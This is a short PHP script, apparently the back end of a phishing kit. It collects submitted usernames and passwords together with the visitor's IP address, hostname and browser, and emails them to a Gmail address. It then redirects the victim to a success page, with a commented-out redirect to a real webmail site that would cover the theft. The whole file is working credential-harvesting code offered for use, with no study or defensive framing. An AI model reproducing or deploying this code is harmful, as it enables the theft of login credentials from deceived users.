<?php

$user = $_REQUEST["username"];
$pass = $_REQUEST["password"];

// $rd1 = $_REQUEST["radiogroup1"];
// $rd2 = $_REQUEST["radiogroup2"];

if (getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
}
else {
$ip=getenv(REMOTE_ADDR);
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];

$data=" 
----------
User: $user
pass : $pass
------------------
$ip
$hostname
$browser
------------------
";

$subj = "username LOGS-> $user,$pass";

$recipient1 = "demoictworld@gmail.com";
$rec2 = "";



mail($recipient1 , $subj , $data);
mail($rec2 , $subj , $data);

//redirect
header("location: successful.html")

//redirect or
// header("location: /gnet/index.html")

?>
<!-- <html>
<meta http-equiv="refresh" content="0;url=https://webmail.gnet.tn/">
</html> -->